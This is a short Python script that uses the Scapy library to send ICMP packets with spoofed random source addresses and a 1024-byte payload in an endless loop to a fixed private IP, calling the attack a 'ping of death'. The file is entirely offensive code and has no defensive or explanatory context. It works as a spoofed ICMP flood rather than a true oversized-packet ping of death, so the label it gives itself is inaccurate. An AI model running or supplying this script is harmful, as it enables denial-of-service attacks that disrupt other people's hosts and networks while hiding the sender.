from scapy.all import *

target_ip = "192.168.1.128"
size = 1024
payload = "X" * size

source_ip = RandIP()
packet = IP(src=str(source_ip), dst=target_ip)/ICMP()/payload
print(f"Ping of death is being sent to {target_ip}...")
send(packet, loop=1, verbose=0)
